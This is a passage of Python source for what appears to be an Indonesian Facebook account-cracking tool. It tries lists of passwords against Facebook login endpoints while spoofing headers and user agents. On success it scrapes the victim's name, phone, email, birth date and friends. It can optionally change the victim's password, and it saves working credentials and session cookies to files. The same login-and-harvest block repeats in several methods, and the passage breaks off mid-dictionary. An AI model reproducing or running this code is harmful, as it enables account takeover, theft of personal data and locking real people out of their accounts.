                        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                        "x-requested-with": "XMLHttpRequest",
                        "sec-fetch-site": "none",
                        "sec-fetch-mode": "navigate",
                        "sec-fetch-user": "?1",
                        "sec-fetch-dest": "document",
                        "origin": "https://free.prod.facebook.com",
                        "referer": "https://mbasic.prod.facebook.com/login/device-based/password/?uid="
                        + user
                        + "&flow=login_no_pin&next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F&refsrc=deprecated&_rdr",
                        "accept-encoding": "gzip, deflate, br",
                        "accept-language": "id-ID;q=0.6,en;q=0.7,en-US;q=0.8,en;q=0.9",
                        "connection": "Keep-Alive",
                        "cookie": (";").join(
                            [
                                "%s=%s" % (key, value)
                                for key, value in r.cookies.get_dict().items()
                            ]
                        ),
                    }
                    po = r.post(
                        "https://free.prod.facebook.com/login/device-based/validate-password/?shbl=0",
                        data=data,
                        headers=head,
                        allow_redirects=False,
                    )
                    if "c_user" in r.cookies.get_dict().keys():
                        self.success += 1
                        head = {
                            "user-agent": "SupportsFresco=1 Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J210F Build/MMB29Q) Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/172.0.0.8.182;FBDV/SM-J210F;FBLC/id_ID;FBOP/20]"
                        }
                        try:
                            self.__cokz = r.cookies.get_dict()
                            self.__cooz = (";").join(
                                [
                                    "%s=%s" % (key, value)
                                    for key, value in r.cookies.get_dict().items()
                                ]
                            )
                            user2 = re.findall("c_user=(.*);xs", self.__cooz)[0]
                        except:
                            pass
                        self.req1 = par(
                            r.get(
                                "https://mbasic.facebook.com/profile.php",
                                headers=head,
                                cookies=self.__cokz,
                            ).text,
                            "html.parser",
                        )
                        try:
                            self.cari_nama = re.findall(
                                "<title>(.*?)</title>", str(self.req1)
                            )
                            self.nama = self.cari_nama[0]
                        except:
                            self.nama = None
                        self.req2 = r.get(
                            "https://mbasic.facebook.com/profile.php?v=info",
                            headers=head,
                            cookies=self.__cokz,
                        ).text
                        try:
                            self.cari_nomor = re.search(
                                ">08(.*?)-(.*?)-(.*?)</span>", str(self.req2)
                            ).groups(1)
                            self.nomor = "08{}{}{}".format(
                                self.cari_nomor[0],
                                self.cari_nomor[1],
                                self.cari_nomor[2],
                            )
                        except:
                            self.nomor = None
                        try:
                            self.req3 = par(
                                r.get(
                                    "https://mbasic.facebook.com/profile.php?v=friends",
                                    headers=head,
                                    cookies=self.__cokz,
                                ).text,
                                "html.parser",
                            )
                            self.teman = re.findall(
                                '\<h3 class\=".*?"\>Teman (.*?)</h3>', str(self.req3)
                            )[0]
                        except:
                            self.teman = None
                        try:
                            self.req4 = r.get(
                                "https://mbasic.facebook.com/settings/email",
                                headers=head,
                                cookies=self.__cokz,
                            )
                            self.acces = par(self.req4.text, "html.parser")
                            self.email = re.findall(
                                '\<span class="s t">(.*?)</span>', str(self.acces)
                            )[0]
                        except:
                            self.email = None
                        try:
                            self.req5 = r.get(
                                "https://mbasic.facebook.com/profile.php?v=info",
                                headers=head,
                                cookies=self.__cokz,
                            )
                            self.acces2 = par(self.req5.text, "html.parser")
                            self.tanggal = self.acces2.find(
                                string=re.compile("Tanggal Lahir")
                            )
                            if self.tanggal:
                                self.tanggal = self.tanggal.find_next("div").text
                            else:
                                self.tanggal = None
                        except:
                            self.tanggal = False
                        Suck = Mek("")
                        Okeh = Suck.add("[italic green] Moch Arif > OK")
                        Okeh.add("[italic white] ID [italic green]: {}".format(user2))
                        Okeh.add("[italic white] Sandi [italic green]: {}".format(pw))
                        Okeh.add(
                            "[italic white] Username [italic green]: {}".format(
                                self.nama
                            )
                        )
                        Okeh.add(
                            "[italic white] Email [italic green]: {}".format(self.email)
                        )
                        Okeh.add(
                            "[italic white] Nomor [italic green]: {}".format(self.nomor)
                        )
                        Okeh.add(
                            "[italic white] Tahun Akun [italic green]: {}".format(
                                self.tahun(user2)
                            )
                        )
                        Okeh.add(
                            "[italic white] Tanggal Lahir [italic green]: {}".format(
                                self.tanggal
                            )
                        )
                        Okeh.add(
                            "[italic white] Jumlah Teman [italic green]: {}".format(
                                self.teman
                            )
                        )
                        if "ya" in self.firstbaru:
                            self.rep = r.get(
                                "https://mbasic.facebook.com/settings/security/password/?",
                                cookies={"cookie": self.__cooz},
                            ).text
                            self.next = re.findall('action\="(.*?)"', self.rep)[1]
                            data = {
                                "fb_dtsg": re.findall(
                                    'name="fb_dtsg" value="(.*?)"', self.rep
                                ),
                                "jazoest": re.findall(
                                    'name="jazoest" value="(.*?)"', self.rep
                                ),
                                "password_change_session_identifier": re.findall(
                                    'name="password_change_session_identifier" value="(.*?)"',
                                    self.rep,
                                ),
                                "password_old": pw,
                                "password_new": self.sandi_baru,
                                "password_confirm": self.sandi_baru,
                                "save": "Simpan perubahan",
                            }
                            po = r.post(
                                "https://mbasic.facebook.com" + str(self.next),
                                cookies={"cookie": self.__cooz},
                                data=data,
                            ).text
                            if "Kata Sandi Telah Diubah" in po:
                                Okeh = Suck.add(
                                    "[italic white] Sandi Baru  [italic green]: {}".format(
                                        self.sandi_baru
                                    )
                                )
                                Okeh.add("[italic green] Berhasil Ubah Sandi")
                            else:
                                Okeh = Suck.add(
                                    "[italic white] Sandi Baru  [italic green]: {}".format(
                                        self.sandi_baru
                                    )
                                )
                                Okeh.add("[italic red] Gagal Ubah Sandi")
                        else:
                            pass
                        self.akf = r.get(
                            "https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",
                            headers=head,
                            cookies={"cookie": self.__cooz},
                        ).text
                        soup = par(self.akf, "html.parser")
                        self.apkaktif = 0
                        for ak in soup.find_all("h3"):
                            if "Ditambahkan" in ak.text:
                                Okeh = Suck.add(
                                    f"[italic white] {str(ak.text).replace(f'Ditambahkan',f' [italic green]Ditambahkan')}[italic white]"
                                )
                                self.apkaktif += 1
                        Okeh.add(
                            "[italic white] Aplikasi Aktif [italic green]: {}".format(
                                self.apkaktif
                            )
                        )
                        Okeh = Suck.add(
                            "[italic white] Cookies [italic green]: {}".format(
                                self.__cooz
                            )
                        )
                        Okeh.add(
                            "[italic white] User Agent [italic green]: {}".format(
                                self.ua
                            )
                        )
                        self.kdl = r.get(
                            "https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",
                            headers=head,
                            cookies={"cookie": self.__cooz},
                        ).text
                        soup = par(self.kdl, "html.parser")
                        self.apkexp = 0
                        for kl in soup.find_all("h3"):
                            if "Kedaluwarsa" in kl.text:
                                Okeh = Suck.add(
                                    f"[italic white] {str(kl.text).replace('Kedaluwarsa',f' [italic yellow]Kedaluwarsa')}[italic white]"
                                )
                                self.apkexp += 1
                        Okeh.add(
                            "[italic white] Aplikasi Expired [italic yellow]: {}".format(
                                self.apkexp
                            )
                        )
                        self.hps = r.get(
                            "https://mbasic.facebook.com/settings/apps/tabbed/?tab=removed",
                            headers=head,
                            cookies={"cookie": self.__cooz},
                        ).text
                        soup = par(self.hps, "html.parser")
                        self.apkdld = 0
                        for exp in soup.find_all("h3"):
                            if "Dihapus" in exp.text:
                                Okeh = Suck.add(
                                    f"[italic white] {str(exp.text).replace('Dihapus',f' [italic red]Dihapus')}[italic white]"
                                )
                                self.apkdld += 1
                        Okeh.add(
                            "[italic white] Aplikasi Deleted [italic red]: {}".format(
                                self.apkdld
                            )
                        )
                        zeeprint(Suck)
                        with open("OK/" + okc, "a") as self.simpan:
                            self.simpan.write(
                                user2 + "|" + pw + "|" + self.__cooz + "\n"
                            )
                        break

                    elif "checkpoint" in r.cookies.get_dict().keys():
                        Suck = Mek("")
                        Cepeh = Suck.add("[italic red] Moch Arif > CP")
                        Cepeh.add("[italic white] ID [italic red]: {}".format(user))
                        Cepeh.add("[italic white] Sandi [italic red]: {}".format(pw))
                        Cepeh.add(
                            "[italic white] Tahun Akun [italic red]: {}".format(
                                self.tahun(user)
                            )
                        )
                        Suck.add(
                            "[italic white] User Agent [italic red]: {}".format(self.ua)
                        )
                        zeeprint(Suck)
                        self.chekpoint += 1
                        with open("CP/" + cpc, "a") as self.simpan:
                            self.simpan.write(user + "|" + pw + "\n")
                        break
                    else:
                        continue
        except (KeyboardInterrupt, Exception) as e:
            time.sleep(
                31
            )  # ;Console().print(f'\n[italic red]{str(e).title()}[italic white]')
        self.looping += 1

    def Asyinc(self, user, pwx):
        try:
            prog.update(
                des,
                description=f"[italic white][[italic purple]{user}[italic white]] [italic white][[italic green] Live : {self.success} [italic white]] [italic white][[italic yellow] Check : {self.chekpoint} [italic white]] [ Die [italic blue]: {len(self.id)}/{self.looping}[italic white]]",
            )
            prog.advance(des)
            self.ua = self.UserAgent()
            for pw in pwx:
                if "ya" in self.uaku:
                    self.ua = self.uamu[0]
                else:
                    self.ua
                with requests.Session() as r:
                    r.headers.update(
                        {
                            "connection": "keep-alive",
                            "accept-language": "id-ID;q=0.7,en-US;q=0.8,en;q=0.9",
                            "sec-fetch-mode": "navigate",
                            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                            "sec-fetch-sest": "document",
                            "sec-fetch-site": "none",
                            "cache-control": "max-age=0",
                            "sec-fetch-user": "?1",
                            "upgrade-insecure-requests": "1",
                            "host": "m.prod.facebook.com",
                            "user-agent": self.ua,
                        }
                    )
                    response = r.get("https://m.prod.facebook.com/login.php?").text
                    data = {
                        "m_ts": re.search(
                            'name="m_ts" value="(.*?)"', str(response)
                        ).group(1),
                        "li": re.search('name="li" value="(.*?)"', str(response)).group(
                            1
                        ),
                        "try_number": 0,
                        "unrecognized_tries": 0,
                        "email": user,
                        "prefill_contact_point": user,
                        "prefill_source": "browser_dropdown",
                        "prefill_type": "password",
                        "first_prefill_source": "browser_dropdown",
                        "first_prefill_type": "contact_point",
                        "had_cp_prefilled": "true",
                        "had_password_prefilled": "true",
                        "is_smart_lock": "false",
                        "bi_xrwh": 0,
                        "encpass": "#PWD_BROWSER:0:{}:{}".format(
                            str(WaktuAwal()).split(".")[0], pw
                        ),
                        "fb_dtsg": re.search(
                            '{"dtsg":{"token":"(.*?)"', str(response)
                        ).group(1),
                        "jazoest": re.search(
                            'name="jazoest" value="(\d+)"', str(response)
                        ).group(1),
                        "lsd": re.search(
                            'name="lsd" value="(.*?)"', str(response)
                        ).group(1),
                        "__dyn": "",
                        "__csr": "",
                        "__req": str(random.choice(["5", "4", "3", "2", "1"])),
                        "__a": re.search('"encrypted":"(.*?)"', str(response)).group(1),
                        "__user": 0,
                    }
                    r.headers.update = {
                        "cookie": (";").join(
                            [
                                "%s=%s" % (key, value)
                                for key, value in r.cookies.get_dict().items()
                            ]
                        ),
                        "sec-fetch-site": "same-origin",
                        "origin": "https://m.prod.facebook.com",
                        "accept": "*/*",
                        "content-type": "application/x-www-form-urlencoded",
                        "x-fb-lsd": re.search(
                            'name="lsd" value="(.*?)"', str(response)
                        ).group(1),
                        "referer": "https://m.prod.facebook.com/login.php?",
                        "content-length": str(
                            len(
                                ("&").join(
                                    [
                                        "%s=%s" % (key, value)
                                        for key, value in data.items()
                                    ]
                                )
                            )
                        ),
                    }
                    po = r.post(
                        "https://m.prod.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100",
                        data=data,
                        allow_redirects=False,
                    )
                    if "c_user" in r.cookies.get_dict().keys():
                        self.success += 1
                        head = {
                            "user-agent": "SupportsFresco=1 Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J210F Build/MMB29Q) Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/172.0.0.8.182;FBDV/SM-J210F;FBLC/id_ID;FBOP/20]"
                        }
                        try:
                            self.__cokz = r.cookies.get_dict()
                            self.__cooz = (";").join(
                                [
                                    "%s=%s" % (key, value)
                                    for key, value in r.cookies.get_dict().items()
                                ]
                            )
                            user2 = re.findall("c_user=(.*);xs", self.__cooz)[0]
                        except:
                            pass
                        self.req1 = par(
                            r.get(
                                "https://mbasic.facebook.com/profile.php",
                                headers=head,
                                cookies=self.__cokz,
                            ).text,
                            "html.parser",
                        )
                        try:
                            self.cari_nama = re.findall(
                                "<title>(.*?)</title>", str(self.req1)
                            )
                            self.nama = self.cari_nama[0]
                        except:
                            self.nama = None
                        self.req2 = r.get(
                            "https://mbasic.facebook.com/profile.php?v=info",
                            headers=head,
                            cookies=self.__cokz,
                        ).text
                        try:
                            self.cari_nomor = re.search(
                                ">08(.*?)-(.*?)-(.*?)</span>", str(self.req2)
                            ).groups(1)
                            self.nomor = "08{}{}{}".format(
                                self.cari_nomor[0],
                                self.cari_nomor[1],
                                self.cari_nomor[2],
                            )
                        except:
                            self.nomor = None
                        try:
                            self.req3 = par(
                                r.get(
                                    "https://mbasic.facebook.com/profile.php?v=friends",
                                    headers=head,
                                    cookies=self.__cokz,
                                ).text,
                                "html.parser",
                            )
                            self.teman = re.findall(
                                '\<h3 class\=".*?"\>Teman (.*?)</h3>', str(self.req3)
                            )[0]
                        except:
                            self.teman = None
                        try:
                            self.req4 = r.get(
                                "https://mbasic.facebook.com/settings/email",
                                headers=head,
                                cookies=self.__cokz,
                            )
                            self.acces = par(self.req4.text, "html.parser")
                            self.email = re.findall(
                                '\<span class="s t">(.*?)</span>', str(self.acces)
                            )[0]
                        except:
                            self.email = None
                        try:
                            self.req5 = r.get(
                                "https://mbasic.facebook.com/profile.php?v=info",
                                headers=head,
                                cookies=self.__cokz,
                            )
                            self.acces2 = par(self.req5.text, "html.parser")
                            self.tanggal = self.acces2.find(
                                string=re.compile("Tanggal Lahir")
                            )
                            if self.tanggal:
                                self.tanggal = self.tanggal.find_next("div").text
                            else:
                                self.tanggal = None
                        except:
                            self.tanggal = False
                        Suck = Mek("")
                        Okeh = Suck.add("[italic green] Moch Arif > OK")
                        Okeh.add("[italic white] ID [italic green]: {}".format(user2))
                        Okeh.add("[italic white] Sandi [italic green]: {}".format(pw))
                        Okeh.add(
                            "[italic white] Username [italic green]: {}".format(
                                self.nama
                            )
                        )
                        Okeh.add(
                            "[italic white] Email [italic green]: {}".format(self.email)
                        )
                        Okeh.add(
                            "[italic white] Nomor [italic green]: {}".format(self.nomor)
                        )
                        Okeh.add(
                            "[italic white] Tahun Akun [italic green]: {}".format(
                                self.tahun(user2)
                            )
                        )
                        Okeh.add(
                            "[italic white] Tanggal Lahir [italic green]: {}".format(
                                self.tanggal
                            )
                        )
                        Okeh.add(
                            "[italic white] Jumlah Teman [italic green]: {}".format(
                                self.teman
                            )
                        )
                        if "ya" in self.firstbaru:
                            self.rep = r.get(
                                "https://mbasic.facebook.com/settings/security/password/?",
                                cookies={"cookie": self.__cooz},
                            ).text
                            self.next = re.findall('action\="(.*?)"', self.rep)[1]
                            data = {
                                "fb_dtsg": re.findall(
                                    'name="fb_dtsg" value="(.*?)"', self.rep
                                ),
                                "jazoest": re.findall(
                                    'name="jazoest" value="(.*?)"', self.rep
                                ),
                                "password_change_session_identifier": re.findall(
                                    'name="password_change_session_identifier" value="(.*?)"',
                                    self.rep,
                                ),
                                "password_old": pw,
                                "password_new": self.sandi_baru,
                                "password_confirm": self.sandi_baru,
                                "save": "Simpan perubahan",
                            }
                            po = r.post(
                                "https://mbasic.facebook.com" + str(self.next),
                                cookies={"cookie": self.__cooz},
                                data=data,
                            ).text
                            if "Kata Sandi Telah Diubah" in po:
                                Okeh = Suck.add(
                                    "[italic white] Sandi Baru  [italic green]: {}".format(
                                        self.sandi_baru
                                    )
                                )
                                Okeh.add("[italic green] Berhasil Ubah Sandi")
                            else:
                                Okeh = Suck.add(
                                    "[italic white] Sandi Baru  [italic green]: {}".format(
                                        self.sandi_baru
                                    )
                                )
                                Okeh.add("[italic red] Gagal Ubah Sandi")
                        else:
                            pass
                        self.akf = r.get(
                            "https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",
                            headers=head,
                            cookies={"cookie": self.__cooz},
                        ).text
                        soup = par(self.akf, "html.parser")
                        self.apkaktif = 0
                        for ak in soup.find_all("h3"):
                            if "Ditambahkan" in ak.text:
                                Okeh = Suck.add(
                                    f"[italic white] {str(ak.text).replace(f'Ditambahkan',f' [italic green]Ditambahkan')}[italic white]"
                                )
                                self.apkaktif += 1
                        Okeh.add(
                            "[italic white] Aplikasi Aktif [italic green]: {}".format(
                                self.apkaktif
                            )
                        )
                        Okeh = Suck.add(
                            "[italic white] Cookies [italic green]: {}".format(
                                self.__cooz
                            )
                        )
                        Okeh.add(
                            "[italic white] User Agent [italic green]: {}".format(
                                self.ua
                            )
                        )
                        self.kdl = r.get(
                            "https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",
                            headers=head,
                            cookies={"cookie": self.__cooz},
                        ).text
                        soup = par(self.kdl, "html.parser")
                        self.apkexp = 0
                        for kl in soup.find_all("h3"):
                            if "Kedaluwarsa" in kl.text:
                                Okeh = Suck.add(
                                    f"[italic white] {str(kl.text).replace('Kedaluwarsa',f' [italic yellow]Kedaluwarsa')}[italic white]"
                                )
                                self.apkexp += 1
                        Okeh.add(
                            "[italic white] Aplikasi Expired [italic yellow]: {}".format(
                                self.apkexp
                            )
                        )
                        self.hps = r.get(
                            "https://mbasic.facebook.com/settings/apps/tabbed/?tab=removed",
                            headers=head,
                            cookies={"cookie": self.__cooz},
                        ).text
                        soup = par(self.hps, "html.parser")
                        self.apkdld = 0
                        for exp in soup.find_all("h3"):
                            if "Dihapus" in exp.text:
                                Okeh = Suck.add(
                                    f"[italic white] {str(exp.text).replace('Dihapus',f' [italic red]Dihapus')}[italic white]"
                                )
                                self.apkdld += 1
                        Okeh.add(
                            "[italic white] Aplikasi Deleted [italic red]: {}".format(
                                self.apkdld
                            )
                        )
                        zeeprint(Suck)
                        with open("OK/" + okc, "a") as self.simpan:
                            self.simpan.write(
                                user2 + "|" + pw + "|" + self.__cooz + "\n"
                            )
                        break

                    elif "checkpoint" in r.cookies.get_dict().keys():
                        Suck = Mek("")
                        Cepeh = Suck.add("[italic red] Moch Arif > CP")
                        Cepeh.add("[italic white] ID [italic red]: {}".format(user))
                        Cepeh.add("[italic white] Sandi [italic red]: {}".format(pw))
                        Cepeh.add(
                            "[italic white] Tahun Akun [italic red]: {}".format(
                                self.tahun(user)
                            )
                        )
                        Suck.add(
                            "[italic white] User Agent [italic red]: {}".format(self.ua)
                        )
                        zeeprint(Suck)
                        self.chekpoint += 1
                        with open("CP/" + cpc, "a") as self.simpan:
                            self.simpan.write(user + "|" + pw + "\n")
                        break
                    else:
                        continue
        except (KeyboardInterrupt, Exception) as e:
            time.sleep(
                31
            )  # ;Console().print(f'\n[italic red]{str(e).title()}[italic white]')
        self.looping += 1

    def Reguler(self, user, pwx):
        try:
            prog.update(
                des,
                description=f"[italic white][[italic purple]{user}[italic white]] [italic white][[italic green] Live : {self.success} [italic white]] [italic white][[italic yellow] Check : {self.chekpoint} [italic white]] [ Die [italic blue]: {len(self.id)}/{self.looping}[italic white]]",
            )
            prog.advance(des)
            self.ua = self.UserAgent()
            for pw in pwx:
                if "ya" in self.uaku:
                    self.ua = self.uamu[0]
                else:
                    self.ua
                with requests.Session() as r:
                    r.headers.update = {
                        "Host": "free.prod.facebook.com",
                        "upgrade-insecure-requests": "1",
                        "user-agent": self.ua,
                        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                        "dnt": str(random.randint(1, 9)),
                        "x-requested-with": "mark.via.gp",
                        "sec-fetch-site": "same-origin",
                        "sec-fetch-mode": "navigate",
                        "sec-fetch-user": "?1",
                        "sec-fetch-dest": "document",
                        "referer": "https://free.prod.facebook.com/",
                        "accept-encoding": "gzip, deflate br",
                        "accept-language": "id-ID;q=0.6,en;q=0.7,en-US;q=0.8,en;q=0.9",
                    }
                    link = r.get(
                        "https://free.prod.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8"
                    )
                    data = {
                        "lsd": re.search(
                            'name="lsd" value="(.*?)"', str(link.text)
                        ).group(1),
                        "jazoest": re.search(
                            'name="jazoest" value="(.*?)"', str(link.text)
                        ).group(1),
                        "email": user,
                        "pass": pw,
                    }
                    head = {
                        "Host": "free.prod.facebook.com",
                        "cache-control": "max-age=0",
                        "upgrade-insecure-requests": "1",
                        "origin": "https://free.prod.facebook.com",
                        "content-type": "application/x-www-form-urlencoded",
                        "user-agent": self.ua,
                        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                        "x-requested-with": "mark.via.gp",
                        "sec-fetch-site": "same-origin",
                        "sec-fetch-mode": "navigate",
                        "sec-fetch-user": "?1",
                        "sec-fetch-dest": "document",
                        "referer": "https://free.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8",
                        "accept-encoding": "gzip, deflate br",
                        "accept-language": "id-ID;q=0.6,en;q=0.7,en-US;q=0.8,en;q=0.9",
                        "view-width": "980",
                        "connection": "Keep-Alive",
                        "cookie": (";").join(
                            [
                                "%s=%s" % (key, value)
                                for key, value in r.cookies.get_dict().items()
                            ]
                        ),
                    }
                    po = r.post(
                        "https://free.prod.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100",
                        headers=head,
                        data=data,
                        allow_redirects=False,
                    )
                    if "c_user" in r.cookies.get_dict().keys():
                        self.success += 1
                        head = {
                            "user-agent": "SupportsFresco=1 Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J210F Build/MMB29Q) Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/172.0.0.8.182;FBDV/SM-J210F;FBLC/id_ID;FBOP/20]"
                        }
                        try:
                            self.__cokz = r.cookies.get_dict()
                            self.__cooz = (";").join(
                                [
                                    "%s=%s" % (key, value)
                                    for key, value in r.cookies.get_dict().items()
                                ]
                            )
                            user2 = re.findall("c_user=(.*);xs", self.__cooz)[0]
                        except:
                            pass
                        self.req1 = par(
                            r.get(
                                "https://mbasic.facebook.com/profile.php",
                                headers=head,
                                cookies=self.__cokz,
                            ).text,
                            "html.parser",
                        )
                        try:
                            self.cari_nama = re.findall(
                                "<title>(.*?)</title>", str(self.req1)
                            )
                            self.nama = self.cari_nama[0]
                        except:
                            self.nama = None
                        self.req2 = r.get(
                            "https://mbasic.facebook.com/profile.php?v=info",
                            headers=head,
                            cookies=self.__cokz,
                        ).text
                        try:
                            self.cari_nomor = re.search(
                                ">08(.*?)-(.*?)-(.*?)</span>", str(self.req2)
                            ).groups(1)
                            self.nomor = "08{}{}{}".format(
                                self.cari_nomor[0],
                                self.cari_nomor[1],
                                self.cari_nomor[2],
                            )
                        except:
                            self.nomor = None
                        try:
                            self.req3 = par(
                                r.get(
                                    "https://mbasic.facebook.com/profile.php?v=friends",
                                    headers=head,
                                    cookies=self.__cokz,
                                ).text,
                                "html.parser",
                            )
                            self.teman = re.findall(
                                '\<h3 class\=".*?"\>Teman (.*?)</h3>', str(self.req3)
                            )[0]
                        except:
                            self.teman = None
                        try:
                            self.req4 = r.get(
                                "https://mbasic.facebook.com/settings/email",
                                headers=head,
                                cookies=self.__cokz,
                            )
                            self.acces = par(self.req4.text, "html.parser")
                            self.email = re.findall(
                                '\<span class="s t">(.*?)</span>', str(self.acces)
                            )[0]
                        except:
                            self.email = None
                        try:
                            self.req5 = r.get(
                                "https://mbasic.facebook.com/profile.php?v=info",
                                headers=head,
                                cookies=self.__cokz,
                            )
                            self.acces2 = par(self.req5.text, "html.parser")
                            self.tanggal = self.acces2.find(
                                string=re.compile("Tanggal Lahir")
                            )
                            if self.tanggal:
                                self.tanggal = self.tanggal.find_next("div").text
                            else:
                                self.tanggal = None
                        except:
                            self.tanggal = False
                        Suck = Mek("")
                        Okeh = Suck.add("[italic green] Moch Arif > OK")
                        Okeh.add("[italic white] ID [italic green]: {}".format(user2))
                        Okeh.add("[italic white] Sandi [italic green]: {}".format(pw))
                        Okeh.add(
                            "[italic white] Username [italic green]: {}".format(
                                self.nama
                            )
                        )
                        Okeh.add(
                            "[italic white] Email [italic green]: {}".format(self.email)
                        )
                        Okeh.add(
                            "[italic white] Nomor [italic green]: {}".format(self.nomor)
                        )
                        Okeh.add(
                            "[italic white] Tahun Akun [italic green]: {}".format(
                                self.tahun(user2)
                            )
                        )
                        Okeh.add(
                            "[italic white] Tanggal Lahir [italic green]: {}".format(
                                self.tanggal
                            )
                        )
                        Okeh.add(
                            "[italic white] Jumlah Teman [italic green]: {}".format(
                                self.teman
                            )
                        )
                        if "ya" in self.firstbaru:
                            self.rep = r.get(
                                "https://mbasic.facebook.com/settings/security/password/?",
                                cookies={"cookie": self.__cooz},
                            ).text
                            self.next = re.findall('action\="(.*?)"', self.rep)[1]
                            data = {
                                "fb_dtsg": re.findall(
                                    'name="fb_dtsg" value="(.*?)"', self.rep
                                ),
                                "jazoest": re.findall(
                                    'name="jazoest" value="(.*?)"', self.rep
                                ),
                                "password_change_session_identifier": re.findall(
                                    'name="password_change_session_identifier" value="(.*?)"',
                                    self.rep,
                                ),
                                "password_old": pw,
                                "password_new": self.sandi_baru,
                                "password_confirm": self.sandi_baru,
                                "save": "Simpan perubahan",
                            }
                            po = r.post(
                                "https://mbasic.facebook.com" + str(self.next),
                                cookies={"cookie": self.__cooz},
                                data=data,
                            ).text
                            if "Kata Sandi Telah Diubah" in po:
                                Okeh = Suck.add(
                                    "[italic white] Sandi Baru  [italic green]: {}".format(
                                        self.sandi_baru
                                    )
                                )
                                Okeh.add("[italic green] Berhasil Ubah Sandi")
                            else:
                                Okeh = Suck.add(
                                    "[italic white] Sandi Baru  [italic green]: {}".format(
                                        self.sandi_baru
                                    )
                                )
                                Okeh.add("[italic red] Gagal Ubah Sandi")
                        else:
                            pass
                        self.akf = r.get(
                            "https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",
                            headers=head,
                            cookies={"cookie": self.__cooz},
                        ).text
                        soup = par(self.akf, "html.parser")
                        self.apkaktif = 0
                        for ak in soup.find_all("h3"):
                            if "Ditambahkan" in ak.text:
                                Okeh = Suck.add(
                                    f"[italic white] {str(ak.text).replace(f'Ditambahkan',f' [italic green]Ditambahkan')}[italic white]"
                                )
                                self.apkaktif += 1
                        Okeh.add(
                            "[italic white] Aplikasi Aktif [italic green]: {}".format(
                                self.apkaktif
                            )
                        )
                        Okeh = Suck.add(
                            "[italic white] Cookies [italic green]: {}".format(
                                self.__cooz
                            )
                        )
                        Okeh.add(
                            "[italic white] User Agent [italic green]: {}".format(
                                self.ua
                            )
                        )
                        self.kdl = r.get(
                            "https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",
                            headers=head,
                            cookies={"cookie": self.__cooz},
                        ).text
                        soup = par(self.kdl, "html.parser")
                        self.apkexp = 0
                        for kl in soup.find_all("h3"):
                            if "Kedaluwarsa" in kl.text:
                                Okeh = Suck.add(
                                    f"[italic white] {str(kl.text).replace('Kedaluwarsa',f' [italic yellow]Kedaluwarsa')}[italic white]"
                                )
                                self.apkexp += 1
                        Okeh.add(
                            "[italic white] Aplikasi Expired [italic yellow]: {}".format(
                                self.apkexp
                            )
                        )
                        self.hps = r.get(
                            "https://mbasic.facebook.com/settings/apps/tabbed/?tab=removed",
                            headers=head,
                            cookies={"cookie": self.__cooz},
                        ).text
                        soup = par(self.hps, "html.parser")
                        self.apkdld = 0
                        for exp in soup.find_all("h3"):
                            if "Dihapus" in exp.text:
                                Okeh = Suck.add(
                                    f"[italic white] {str(exp.text).replace('Dihapus',f' [italic red]Dihapus')}[italic white]"
                                )
                                self.apkdld += 1
                        Okeh.add(
                            "[italic white] Aplikasi Deleted [italic red]: {}".format(
                                self.apkdld
                            )
                        )
                        zeeprint(Suck)
                        with open("OK/" + okc, "a") as self.simpan:
                            self.simpan.write(
                                user2 + "|" + pw + "|" + self.__cooz + "\n"
                            )
                        break

                    elif "checkpoint" in r.cookies.get_dict().keys():
                        Suck = Mek("")
                        Cepeh = Suck.add("[italic red] Moch Arif > CP")
                        Cepeh.add("[italic white] ID [italic red]: {}".format(user))
                        Cepeh.add("[italic white] Sandi [italic red]: {}".format(pw))
                        Cepeh.add(
                            "[italic white] Tahun Akun [italic red]: {}".format(
                                self.tahun(user)
                            )
                        )
                        Suck.add(
                            "[italic white] User Agent [italic red]: {}".format(self.ua)
                        )
                        zeeprint(Suck)
                        self.chekpoint += 1
                        with open("CP/" + cpc, "a") as self.simpan:
                            self.simpan.write(user + "|" + pw + "\n")
                        break
                    else:
                        continue
        except (KeyboardInterrupt, Exception) as e:
            time.sleep(
                31
            )  # ;Console().print(f'\n[italic red]{str(e).title()}[italic white]')
        self.looping += 1

    def Bapi(self, user, pwx):
        try:
            prog.update(
                des,
                description=f"[italic white][[italic purple]{user}[italic white]] [italic white][[italic green] Live : {self.success} [italic white]] [italic white][[italic yellow] Check : {self.chekpoint} [italic white]] [ Die [italic blue]: {len(self.id)}/{self.looping}[italic white]]",
            )
            prog.advance(des)
            self.ua = self.UserApi()
            for pw in pwx:
                if "ya" in self.uaku:
                    self.ua = self.uamu[0]
                else:
                    self.ua
                with requests.Session() as r:
                    data = {
                        "adid": str(uuid.uuid4()),
                        "format": "json",
                        "device_id": str(uuid.uuid4()),
                        "email": user,
                        "password": pw,
                        "generate_analytics_claim": "1",
                        "community_id": "",
                        "cpl": "true",
                        "try_num": "1",
                        "family_device_id": str(uuid.uuid4()),
                        "credentials_type": "device_based_login_password",
                        "generate_session_cookies": "1",
                        "error_detail_type": "button_with_disabled",
                        "source": "device_based_login",
                        "machine_id": str(uuid.uuid4()),
